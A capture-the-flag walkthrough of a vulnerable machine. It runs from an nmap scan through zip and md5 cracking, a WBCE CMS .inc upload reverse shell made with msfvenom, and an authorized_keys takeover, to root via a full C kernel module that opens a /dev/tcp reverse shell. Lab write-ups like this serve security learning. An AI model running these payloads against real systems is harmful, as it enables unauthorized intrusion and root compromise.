

we start by scanning the network with nmap -sV ip 

after scanning the network we can see there is SSH port (22) and http port (80) which the one interesting us,
when we load to the main page we have a loading telling us that site is in maintnance so we need to find.

Lets scan the differents paths : python3 dirsearch.py -u IP:PORT 

we have diferent directorys, by navigating to it one by one we fond suspecious zip file that wa can download : 

Lets try top open it ! 

Oh it ask us for a password, hopefuly we can use some tools to try cracking the zip password like : 


Bingo, when we got the password we got this file,

it tells that admin password is : but it encrypted in md5 hash so we need to decrypt it, we will first try to see online tools if they already have this password hash stocked in their data base, if not we will try to crack it !


Bingo again, we have admin password, lets connect into the admin interface

now we arrive at an interface of WBCE CMS 1.6.2, when googling it we can see there is an exploit by injecting .inc files
.inc files are used in PHP to include code. If the server treats them like .php, uploading one can lead to executing code on the server
https://www.exploit-db.com/exploits/52039

lets create our own .inc reverse shell with msfvenom

msfvenom -p php/reverse_php LHOST=YOUR_MACHINE_IP LPORT=4444 -f raw > shell.inc

now we put our listener : nc -lvnp 4444

after that we upload it in /media/ double click on it and we got the shell !

executing commands like whoami, tell us we are www-data the webserver user, 

navigating to /home/ we found an user, listing his directory content we see a flag.txt BUT we cannot open it due to our permission, but something is interesting, we have full rights on the .ssh folder, navigating there we see .authorized_key a file storing the keys autorized to connect to the user via ssh without a password ! since we have the full rights on the file 
we gonna go back on our machine and create an ssh key

ssh-keygen -t rsa -b 4096 -f mykey
![image](https://github.com/user-attachments/assets/1f034acc-53a9-4642-86d3-65b072c6d5b2)


open mykey.pub and copy all the content.

now go back to your listener shell and do echo "SSH_PUB_KEY" > /home/user/.ssh/authorized_key

and now we can try to connect to the user ssh key to connect to the user : ssh -i mykey user@IP


Bingo, we have user shell, we can cat the flag file with cat flag.txt


now we need the root file, obviously we dont have root access or it bee too easy, by executing sudo -l we can see that we can execute .ko file
.ko files are kernel modules — basically code we can plug directly into the Linux kernel. Since we can load one as sudo, we can write a malicious module that gives us root access when it gets loaded. Game over
.ko files are developed in C, and only in C so we gonna develope (or get in github) a reverse shell in C, the objective here is to put a listener on another port in our kali machine, when we run our .ko file since it gonna run with root it gonna open reverse shell in root

in the ssh host create the file cyberavengers.c and copy past your code, mine was : 

```ccyberavengers.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define REMOTE_IP "IP"   // Remplacez par votre IP
#define REMOTE_PORT "8888"      // Remplacez par votre port

static int reverse_shell_thread(void *data)
{
    /* Commande reverse shell utilisant bash et /dev/tcp */
    char *argv[] = { "/bin/bash", "-c",
        "bash -i >& /dev/tcp/" REMOTE_IP "/" REMOTE_PORT " 0>&1", NULL };
    char *envp[] = { "PATH=/usr/bin:/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static int __init rev_init(void)
{
    printk(KERN_INFO "Reverse shell module loaded\n");
    /* On démarre un thread qui exécutera le reverse shell */
    kthread_run(reverse_shell_thread, NULL, "rev_shell");
    return 0;
}

static void __exit rev_exit(void)
{
    printk(KERN_INFO "Reverse shell module unloaded\n");
}

module_init(rev_init);
module_exit(rev_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CTF Participant");
MODULE_DESCRIPTION("Module kernel minimaliste pour reverse shell (à usage restreint)");
```

create Makefile to compile the c file : 
obj-m += cyberavengers.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean


after that put another listener on our 8888 port : 

nc -lvnp 8888 

run the sudo command : /sbin/insmod cyberavengers.ko

and bingo ! you should have a reverse shell in our netcat with root user !

the flag is on /root/flag.txt !

Have a great day ! 



